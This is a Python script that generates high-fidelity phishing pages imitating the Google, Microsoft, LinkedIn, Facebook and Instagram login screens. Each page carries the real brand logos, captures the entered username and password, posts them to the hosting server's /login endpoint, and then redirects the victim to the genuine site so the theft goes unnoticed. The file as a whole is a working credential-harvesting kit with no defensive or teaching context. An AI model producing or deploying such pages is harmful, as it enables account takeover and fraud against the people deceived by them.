import os

OUTPUT_DIR = "core/assets/templates/high_fidelity"

if not os.path.exists(OUTPUT_DIR):
    os.makedirs(OUTPUT_DIR)

# Helper to save template
def save_template(name, content):
    path = os.path.join(OUTPUT_DIR, f"{name}.html")
    with open(path, "w") as f:
        f.write(content)
    print(f"[+] Generated {name}.html")

# 1. GOOGLE
google_html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link rel="icon" href="https://www.google.com/favicon.ico">
    <style>
        body {
            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
            background: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #202124;
        }
        .container {
            width: 450px;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .logo {
            height: 24px;
            margin-bottom: 16px;
        }
        h1 {
            font-size: 24px;
            font-weight: 400;
            margin: 0 0 8px;
        }
        p {
            font-size: 16px;
            margin: 0 0 40px;
            color: #202124;
        }
        .input-group {
            width: 100%;
            position: relative;
            margin-bottom: 8px;
        }
        input {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            box-sizing: border-box;
            outline: none;
            transition: 0.2s;
        }
        input:focus {
            border: 2px solid #1a73e8;
            padding: 12px 14px; /* Adjust for border */
        }
        .forgot {
            width: 100%;
            text-align: left;
            margin-bottom: 40px;
        }
        .forgot a {
            color: #1a73e8;
            font-weight: 500;
            text-decoration: none;
            font-size: 14px;
        }
        .actions {
            width: 100%;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .create {
            color: #1a73e8;
            font-weight: 500;
            text-decoration: none;
            font-size: 14px;
        }
        .next-btn {
            background-color: #1a73e8;
            color: #fff;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-weight: 500;
            font-size: 14px;
            cursor: pointer;
        }
        .next-btn:hover {
            background-color: #1558d6;
            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
        }
        @media (max-width: 600px) {
            .container {
                border: none;
                width: 100%;
                padding: 24px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" class="logo">
        <h1>Sign in</h1>
        <p>Use your Google Account</p>
        
        <form id="login-form" style="width: 100%;" onsubmit="handleLogin(event)">
            <div class="input-group">
                <input type="email" id="email" name="email" placeholder="Email or phone" required>
            </div>
            <div class="input-group" style="margin-top: 10px;">
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
            </div>
            
            <div class="forgot">
                <a href="#">Forgot email?</a>
            </div>
            
            <div class="actions">
                <a href="#" class="create">Create account</a>
                <button type="submit" class="next-btn">Next</button>
            </div>
        </form>
    </div>

    <script>
        function handleLogin(event) {
            event.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            fetch('/login', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({username: email, password: password})
            }).then(res => {
                window.location.href = "https://accounts.google.com/";
            });
        }
    </script>
</body>
</html>
"""
save_template("google", google_html)

# 2. MICROSOFT
microsoft_html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <link rel="icon" href="https://aadcdn.msauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
    <style>
        body {
            font-family: 'Segoe UI', 'Helvetica Neue', 'Lucida Grande', 'Roboto', 'Ebrima', 'Nirmala UI', 'Gadugi', 'Segoe Xbox Symbol', 'Segoe UI Symbol', 'Meiryo UI', 'Khmer UI', 'Tunga', 'Lao UI', 'Raavi', 'Iskoola Pota', 'Latha', 'Leelawadee', 'Microsoft YaHei UI', 'Microsoft JhengHei UI', 'Malgun Gothic', 'Estrangelo Edessa', 'Microsoft Himalaya', 'Microsoft New Tai Lue', 'Microsoft PhagsPa', 'Microsoft Tai Le', 'Microsoft Yi Baiti', 'Mongolian Baiti', 'MV Boli', 'Myanmar Text', 'Cambria Math', sans-serif;
            background: #f0f2f5;
            background-image: url('https://aadcdn.msauth.net/shared/1.0/content/images/appbackgrounds/49_7916a8b4b1a50a498e72.jpg');
            background-size: cover;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: #fff;
            width: 440px;
            padding: 44px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            position: relative;
        }
        .logo {
            height: 24px;
            margin-bottom: 20px;
        }
        h1 {
            font-size: 24px;
            font-weight: 600;
            margin: 0 0 10px;
            color: #1b1b1b;
        }
        .input-group {
            margin-top: 20px;
            margin-bottom: 16px;
        }
        input {
            width: 100%;
            height: 36px;
            padding: 6px 10px;
            border: 1px solid #8f8f8f;
            font-size: 15px;
            box-sizing: border-box;
            outline: none;
        }
        input:focus {
            border-color: #0067b8;
            border-bottom-width: 2px;
        }
        .actions {
            margin-top: 16px;
            display: flex;
            justify-content: flex-end;
        }
        .next-btn {
            background-color: #0067b8;
            color: #fff;
            border: none;
            padding: 8px 36px;
            font-size: 15px;
            cursor: pointer;
            min-width: 108px;
        }
        .next-btn:hover {
            background-color: #005da6;
        }
        .links {
            margin-top: 20px;
            font-size: 13px;
        }
        .links a {
            color: #0067b8;
            text-decoration: none;
        }
        .links a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft" class="logo">
        <h1>Sign in</h1>
        
        <form id="login-form" onsubmit="handleLogin(event)">
            <div class="input-group">
                <input type="text" id="email" name="email" placeholder="Email, phone, or Skype" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" name="password" placeholder="Password" required>
            </div>
            
            <div class="links">
                No account? <a href="#">Create one!</a>
            </div>
            
            <div class="actions">
                <button type="submit" class="next-btn">Next</button>
            </div>
        </form>
    </div>

    <script>
        function handleLogin(event) {
            event.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            fetch('/login', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({username: email, password: password})
            }).then(res => {
                window.location.href = "https://login.microsoftonline.com/";
            });
        }
    </script>
</body>
</html>
"""
save_template("microsoft", microsoft_html)

# 3. LINKEDIN
linkedin_html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LinkedIn Login, Sign in | LinkedIn</title>
    <link rel="icon" href="https://static.licdn.com/sc/h/al2o9zrvru7aqj8e1x2rzsrca">
    <style>
        body {
            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", "Fira Sans", Ubuntu, Oxygen, "Oxygen Sans", Cantarell, "Droid Sans", "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Lucida Grande", Helvetica, Arial, sans-serif;
            background-color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            margin: 0;
            padding: 0;
        }
        .header {
            width: 100%;
            padding: 30px 0;
            padding-left: 50px;
        }
        .logo {
            color: #0a66c2;
            font-size: 30px;
            font-weight: bold;
            text-decoration: none;
        }
        .card {
            width: 350px;
            padding: 24px;
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
            margin-top: 20px;
        }
        h1 {
            font-size: 32px;
            margin: 0 0 4px;
            font-weight: 600;
            color: rgba(0,0,0,0.9);
        }
        .subtitle {
            font-size: 16px;
            margin-bottom: 24px;
            color: rgba(0,0,0,0.9);
        }
        .form-group {
            margin-bottom: 12px;
        }
        input {
            width: 100%;
            padding: 14px 12px;
            border: 1px solid rgba(0,0,0,0.6);
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
        }
        input:focus {
            border-color: #0a66c2;
            border-width: 2px;
            padding: 13px 11px;
            outline: none;
        }
        .forgot {
            font-size: 14px;
            color: #0a66c2;
            text-decoration: none;
            font-weight: 600;
            display: inline-block;
            margin: 10px 0 20px;
        }
        .btn {
            width: 100%;
            background: #0a66c2;
            color: white;
            border: none;
            border-radius: 24px;
            padding: 14px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }
        .btn:hover {
            background: #004182;
        }
        .join {
            margin-top: 24px;
            text-align: center;
            font-size: 16px;
        }
        .join a {
            color: #0a66c2;
            font-weight: 600;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="header">
        <a href="#" class="logo">Linked<span style="background:#0a66c2; color:white; border-radius: 2px; padding: 0 2px;">in</span></a>
    </div>

    <div class="card">
        <h1>Sign in</h1>
        <p class="subtitle">Stay updated on your professional world</p>

        <form id="login-form" onsubmit="handleLogin(event)">
            <div class="form-group">
                <input type="text" id="username" placeholder="Email or Phone" required>
            </div>
            <div class="form-group">
                <input type="password" id="password" placeholder="Password" required>
            </div>
            
            <a href="#" class="forgot">Forgot password?</a>
            
            <button type="submit" class="btn">Sign in</button>
        </form>
    </div>

    <div class="join">
        New to LinkedIn? <a href="#">Join now</a>
    </div>

    <script>
        function handleLogin(event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            fetch('/login', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({username: username, password: password})
            }).then(res => {
                window.location.href = "https://www.linkedin.com/";
            });
        }
    </script>
</body>
</html>
"""
save_template("linkedin", linkedin_html)

# 4. FACEBOOK
facebook_html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico">
    <style>
        body {
            font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .content {
            display: flex;
            align-items: center;
            justify-content: space-between;
            width: 980px;
            padding-bottom: 100px;
        }
        .left-col {
            width: 580px;
            padding-right: 32px;
        }
        .logo {
            height: 106px;
            margin: -28px;
        }
        h2 {
            font-size: 28px;
            font-weight: normal;
            line-height: 32px;
            width: 500px;
            margin-top: 10px;
        }
        .card {
            background-color: #fff;
            border: none;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            box-sizing: border-box;
            margin: 40px 0 0;
            padding: 20px 0 28px;
            width: 396px;
            text-align: center;
        }
        .form-container {
            padding: 0 16px;
        }
        input {
            font-size: 17px;
            padding: 14px 16px;
            width: 100%;
            border-radius: 6px;
            border: 1px solid #dddfe2;
            margin-bottom: 12px;
            box-sizing: border-box;
        }
        input:focus {
            border-color: #1877f2;
            outline: none;
            box-shadow: 0 0 0 2px #e7f3ff;
        }
        .btn {
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            line-height: 48px;
            padding: 0 16px;
            width: 100%;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 10px;
        }
        .btn:hover {
            background-color: #166fe5;
        }
        .forgot {
            color: #1877f2;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
            display: block;
            margin-bottom: 20px;
        }
        .divider {
            align-items: center;
            border-bottom: 1px solid #dadde1;
            display: flex;
            margin: 20px 16px;
            text-align: center;
        }
        .create-btn {
            background-color: #42b72a;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            line-height: 48px;
            padding: 0 16px;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
            display: inline-block;
        }
        .create-btn:hover {
            background-color: #36a420;
        }
        @media (max-width: 900px) {
            .content {
                flex-direction: column;
                width: 100%;
                padding-top: 40px;
            }
            .left-col {
                text-align: center;
                width: auto;
                padding: 0;
                margin-bottom: 40px;
            }
            .logo {
                margin: 0;
                height: 60px;
            }
            h2 {
                font-size: 24px;
                width: auto;
            }
        }
    </style>
</head>
<body>
    <div class="content">
        <div class="left-col">
            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" class="logo">
            <h2>Facebook helps you connect and share with the people in your life.</h2>
        </div>
        
        <div class="card">
            <form id="login-form" class="form-container" onsubmit="handleLogin(event)">
                <input type="text" id="email" placeholder="Email address or phone number" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit" class="btn">Log In</button>
                <a href="#" class="forgot">Forgotten password?</a>
                <div class="divider"></div>
                <button type="button" class="create-btn">Create new account</button>
            </form>
        </div>
    </div>

    <script>
        function handleLogin(event) {
            event.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            fetch('/login', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({username: email, password: password})
            }).then(res => {
                window.location.href = "https://www.facebook.com/";
            });
        }
    </script>
</body>
</html>
"""
save_template("facebook", facebook_html)

# 5. INSTAGRAM
instagram_html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            width: 350px;
            display: flex;
            flex-direction: column;
        }
        .card {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px 40px;
            margin-bottom: 10px;
            text-align: center;
        }
        .logo {
            margin: 22px auto 12px;
            background-image: url("https://static.cdninstagram.com/rsrc.php/v3/yS/r/ajlEU-wJeze.png");
            background-position: 0 -52px;
            background-size: 176px 181px;
            height: 51px;
            width: 175px;
            display: block;
        }
        input {
            width: 100%;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 9px 0 7px 8px;
            margin-bottom: 6px;
            font-size: 12px;
            box-sizing: border-box;
            outline: none;
        }
        input:focus {
            border: 1px solid #a8a8a8;
        }
        .btn {
            width: 100%;
            background-color: #0095f6;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-weight: 600;
            padding: 5px 9px;
            margin-top: 8px;
            cursor: pointer;
            font-size: 14px;
        }
        .btn:disabled {
            background-color: #b2dffc;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 10px 0 18px;
        }
        .line {
            height: 1px;
            background-color: #dbdbdb;
            flex: 1;
        }
        .or {
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            margin: 0 18px;
        }
        .fb-login {
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 8px 0;
        }
        .forgot {
            font-size: 12px;
            color: #00376b;
            text-decoration: none;
            margin-top: 12px;
            display: block;
        }
        .signup-text {
            font-size: 14px;
            margin: 15px;
        }
        .signup-text a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <span class="logo"></span>
            
            <form id="login-form" style="margin-top: 24px;" onsubmit="handleLogin(event)">
                <input type="text" id="username" placeholder="Phone number, username, or email" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit" class="btn">Log In</button>
            </form>
            
            <div class="divider">
                <div class="line"></div>
                <div class="or">OR</div>
                <div class="line"></div>
            </div>
            
            <a href="#" class="fb-login">Log in with Facebook</a>
            <a href="#" class="forgot">Forgot password?</a>
        </div>
        
        <div class="card" style="padding: 10px 0;">
            <p class="signup-text">Don't have an account? <a href="#">Sign up</a></p>
        </div>
    </div>

    <script>
        function handleLogin(event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            fetch('/login', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({username: username, password: password})
            }).then(res => {
                window.location.href = "https://www.instagram.com/";
            });
        }
    </script>
</body>
</html>
"""
save_template("instagram", instagram_html)

